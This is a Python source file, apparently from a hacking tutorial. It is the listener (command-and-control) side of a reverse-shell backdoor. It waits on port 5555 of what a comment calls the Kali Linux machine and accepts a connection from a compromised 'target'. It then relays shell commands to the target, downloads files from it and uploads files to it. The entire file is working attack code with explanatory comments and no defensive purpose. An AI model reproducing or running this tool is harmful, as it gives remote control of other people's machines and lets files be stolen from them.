import socket #for setting up a connection betwee 2 machines
import json #for easy data parsing
import os


def reliable_send(data): #data = data that is being sent
	jsondata = json.dumps(data) #turns the data python object to json string
	target.send(jsondata.encode()) #encode data the send to target

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip() #take in data and decode it
			return json.loads(data) #return the data
		except ValueError:
			continue #continue to take in data if download not complete

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb') #file object to store the contents of the file we want to download
	target.settimeout(1) #crash prevention
	chunk = target.recv(1024) #small amount of data received multiple times
	while chunk:
		f.write(chunk) #add data chunk to file 'f'
		try:
			chunk = target.recv(1024) #try to get another chunk
		except socket.timeout as e: #if we reach the end of the file
			break
	target.settimeout(None) #cancel out the crash prevention
	f.close() #close the file


def target_communication(): #takes user commands and sends them to the backdoor program
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command) #send the user command to the target computer
		#after sending command, check what command was
		if command == 'quit':
			break #exit the shell and the program
		elif command == 'clear':
			os.system('clear') #clears the shell
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_recv() #recieves response data from target after target runs user command
			print(result) #prints response



sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #AFINET = make connection over IPv4| SOCKSTREAM = use TCP connection
sock.bind(('IPADDRESS', 5555)) #port and IP address of Kali Linux Machine
print('[+] Listening For The Incoming Connections')
sock.listen(5) #listen for incoming connections
target, ip = sock.accept() #accept incoming connection and store target connection variables
print('[+] Target Connected From: ' + str(ip))
target_communication()
